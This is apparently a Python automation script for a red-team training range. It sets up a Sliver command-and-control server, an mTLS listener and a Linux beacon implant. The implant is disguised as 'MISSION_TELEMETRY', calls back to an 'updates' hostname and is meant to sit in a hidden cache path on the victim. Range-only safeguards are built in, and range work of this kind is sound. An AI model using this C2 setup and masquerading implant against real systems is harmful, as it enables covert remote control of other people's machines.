#!/usr/bin/env python3
"""Provision a basic, readable Sliver beacon on the NEW range C2 only.

No public listener, evasion, packing, process injection, or system hiding is
configured. The operator API stays loopback-only. Artifacts are copied by
Ansible to the victim over SSH, never served to the public Internet.
"""
from __future__ import annotations
import hashlib
import json
import os
from pathlib import Path
import socket
import subprocess
import time

HOME = Path("/var/lib/ghostlock-sliver")
STATE = HOME / "state"
PROFILE = HOME / "operator.cfg"
ARTIFACT = HOME / "artifacts/mission-agent"


def sliver(arguments, *, timeout=120):
    args = ["runuser", "-u", "sliver", "--", "env", f"HOME={HOME}", f"SLIVER_ROOT_DIR={STATE}", *arguments]
    # runuser preserves the caller's cwd. Ansible starts in /root, which the
    # unprivileged client cannot traverse; its OPFOR initialization then fails.
    result = subprocess.run(args, cwd=HOME, capture_output=True, text=True, timeout=timeout)
    log = HOME / "last-command.log"
    log.write_text(result.stdout + result.stderr)
    log.chmod(0o600)
    if result.returncode: raise RuntimeError("Sliver setup command failed; inspect the private C2 setup log.")
    return result.stdout


def console(commands, *, timeout=120):
    script = HOME / "setup.rc"
    script.write_text(commands + "\n")
    script.chmod(0o600)
    import pwd
    identity = pwd.getpwnam("sliver")
    os.chown(script, identity.pw_uid, identity.pw_gid)
    result = sliver(["/opt/sliver/sliver-client", "--config", str(PROFILE), "--rc", str(script)], timeout=timeout)
    (HOME / "last-setup.log").write_text(result)
    return result


def listener_open():
    try:
        with socket.create_connection(("10.80.1.10", 443), timeout=2): return True
    except OSError: return False


def main():
    marker = json.loads(Path("/etc/ghostlock-dev-range.json").read_text())
    if marker.get("role") != "c2": raise RuntimeError("C2 role marker required.")
    if not PROFILE.exists():
        sliver(["/opt/sliver/sliver-server", "operator", "--name", "dev-automation", "--lhost", "127.0.0.1",
                "--lport", "31337", "--permissions", "all", "--save", str(PROFILE)], timeout=180)
        if not PROFILE.is_file(): raise RuntimeError("Operator profile was not created.")
        PROFILE.chmod(0o600)
    if not listener_open():
        # v1.7.9 saves listener jobs server-side. There is no --persistent flag
        # on its mtls command; a restart test verifies actual persistence.
        console("mtls --lhost 10.80.1.10 --lport 443")
        if not listener_open(): raise RuntimeError("The range-only mTLS listener did not start.")
    if not ARTIFACT.exists():
        commands = (
            "generate beacon --os linux --arch amd64 --format exe "
            "--name MISSION_TELEMETRY --mtls updates.ops-support.test:443 "
            "--skip-symbols --debug --seconds 10 --jitter 0 "
            f"--save {ARTIFACT} --timeout 1200"
        )
        console(commands, timeout=1500)
        if not ARTIFACT.is_file() or ARTIFACT.stat().st_size < 10000:
            raise RuntimeError("Implant generation failed; inspect private C2 logs.")
        print("created prototype implant")
    with ARTIFACT.open("rb") as stream: digest = hashlib.file_digest(stream, "sha256").hexdigest()
    manifest = {"deployment_id": marker["deployment_id"], "sliver_version": "1.7.9",
                "transport": "mtls", "endpoint": "updates.ops-support.test:443", "obfuscated": False,
                "debug": True, "sha256": digest, "path_on_victim": "/var/lib/mission/.cache/telemetry/mission-agent"}
    (HOME / "prototype-implant.json").write_text(json.dumps(manifest, indent=2) + "\n")
    print("verified prototype artifact", digest)


if __name__ == "__main__": main()

